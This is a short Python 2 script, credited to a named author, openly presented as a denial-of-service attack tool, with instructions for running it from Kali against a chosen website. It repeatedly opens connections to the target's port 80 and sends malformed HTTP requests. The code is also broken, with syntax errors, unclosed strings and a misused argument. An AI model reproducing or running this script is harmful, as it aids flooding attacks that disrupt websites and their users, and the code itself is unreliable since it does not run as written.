#Abel Tilahun
#DOS attack using kali, Python Script
#!/user/bin/env python
import socket
import sys
import os

print "][ Attacking " + sys.argv[1] + " ...]["
#Where argv[1] is the target site(URL)
print "Injecting " + sys.argv[2];
#Where argv[2] is the number of packets to be sent
a = []

def attackingDoS():
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((sys.argv[1], 80)
      print ">> GET /" + sys.argv[2] + "HTTP/1.1
      s.send("GET /" + sys.argv[2] + "HTTP/1.1\r\n")
      s.send("HOST: "sys.argv[1] + "/r/n/r/n")
      s.close()

for i in range(1, 5000):
      attackingDoS()
"""
How To Use, Open up your kali Terminal Teacherye, Then
Go to the dir where you placed this python script
Then type in thefile python filename(dosattackabel.py) then
what site you want to target( url) with an int value of packets
you want to send.

Example
python dosattackabel.py www.abelisawesome.com 400
"""
